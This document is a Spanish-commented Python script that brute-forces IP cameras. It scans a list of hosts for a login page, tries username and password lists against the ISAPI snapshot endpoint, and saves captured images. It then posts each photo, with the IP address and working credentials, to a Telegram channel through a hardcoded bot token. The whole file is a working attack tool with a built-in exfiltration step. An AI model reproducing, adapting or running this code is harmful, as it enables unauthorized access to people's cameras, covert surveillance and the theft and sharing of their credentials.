import asyncio
import ipaddress
import os
import random
import sqlite3
from colorama import Fore, Style
import httpx
import base64
from art import *
from telegram import Bot, InputFile

# Crea una instancia del bot de Telegram
bot = Bot(token="6065013641:AAGKxQM-BvTd4IqzUQO-1JGmeqOAoY-70WU")

async def check_camera(ip, usernames, passwords, port=80):
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            url = f"http://{ip}:{port}/doc/page/login.asp?_"
            response = await client.get(url, headers=headers)
            if response.status_code == 200:
                print(Fore.BLUE + f"[+] Página de inicio de sesión encontrada en {ip}" + Style.RESET_ALL)
                with open("Online.txt", "a") as f:
                    f.write(ip + "\n")
                for username in usernames:
                    for password in passwords:
                        auth_bytes = f"{username}:{password}".encode('utf-8')
                        auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                        auth_headers = {"Authorization": f"Basic {auth_b64}", "Accept": "application/octet-stream", "User-Agent": headers["User-Agent"]}
                        url = f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture"
                        response = await client.get(url, headers=auth_headers, timeout=5)
                        if response.status_code == 200 and response.headers.get("Content-Type") == "image/jpeg":
                            print(Fore.GREEN + f"[+] Conectado a {ip}" + Style.RESET_ALL)
                            filename = f"pics/{ip}_{username}_{password}_{port}.jpg"
                            with open(filename, "wb") as f:
                                f.write(response.content)
                            print(Fore.BLUE + f"[+] Imagen guardada de la cámara {ip}" + Style.RESET_ALL)

                            info = f"IP: {ip}\nUsuario: {username}\nContraseña: {password}\nPuerto: {port}"
                            # Enviar imagen y texto al canal de Telegram
                            with open(filename, "rb") as f:
                                await bot.send_photo(chat_id="@NOMBRE_DE_CANAL", photo=InputFile(f), caption=info)

            else:
                print(Fore.YELLOW + f"[!] Página de inicio de sesión no encontrada en {ip}" + Style.RESET_ALL)
    except asyncio.TimeoutError:
        print(Fore.RED + f"[-] Conexión a {ip} agotada" + Style.RESET_ALL)
    except (httpx.RequestError, OSError):
        pass

async def scan_hosts(port=80):
    hosts_file_path = "host.txt"
    credentials_file_path = "pass.txt"
    users_file_path = "user.txt"
    try:
        with open(hosts_file_path) as f:
            hosts = [line.strip() for line in f.readlines()]
        with open(credentials_file_path) as f:
            passwords = [line.strip() for line in f.readlines()]
        with open(users_file_path) as f:
            users = [line.strip() for line in f.readlines()]
    except FileNotFoundError as e:
        print(Fore.RED + f"[-] {e.filename} no encontrado" + Style.RESET_ALL)
        return

    if not os.path.exists("pics"):
        os.makedirs("pics")

    total_hosts = len(hosts)
    current_host_count = 0
    tasks = []
    scanned_ips = set()  # Conjunto para realizar un seguimiento de las IPs ya escaneadas

    async with httpx.AsyncClient() as client:
        semaphore = asyncio.Semaphore(100)  # Limita el número de conexiones concurrentes
        for host in hosts:
            current_host_count += 1
            print(f"Escanenado {host}... ({current_host_count}/{total_hosts})")
            try:
                ip = ipaddress.ip_address(host)
                if str(ip) in scanned_ips:  # Verifica si la IP ya ha sido escaneada
                    continue
                async with semaphore:
                    task = asyncio.create_task(check_camera(str(ip), users, passwords, port))
                    tasks.append(task)
                    scanned_ips.add(str(ip))  # Agrega la IP escaneada al conjunto
            except ValueError:
                print(Fore.RED + f"[-] {host} no es una dirección IP válida" + Style.RESET_ALL)
                continue

        await asyncio.gather(*tasks)

# Define el logotipo personalizado
logo = """
             _    __..-:┑
    TG: @SlickMercy
"""

# Imprime el logotipo personalizado
print(Fore.YELLOW + logo + Style.RESET_ALL)

# Solicita el puerto al usuario
port = input("Ingresa el número de puerto (el valor predeterminado es 80): ")
port = int(port) if port else 80

# Ejecuta la función scan_hosts con el valor proporcionado
asyncio.run(scan_hosts(port))